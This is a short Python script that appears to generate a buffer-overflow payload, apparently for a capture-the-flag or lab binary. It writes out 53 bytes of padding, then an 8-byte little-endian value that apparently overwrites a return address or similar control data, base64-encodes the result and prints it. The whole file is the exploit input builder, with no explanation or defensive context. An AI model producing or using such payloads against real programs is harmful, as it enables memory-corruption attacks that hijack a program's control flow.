
import sys
import struct
import base64

buf = b'ooooooooooooooooooooooooooooooooooooooooooooooooooooo'
buf += struct.pack('<Q', 11357887892752563903)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
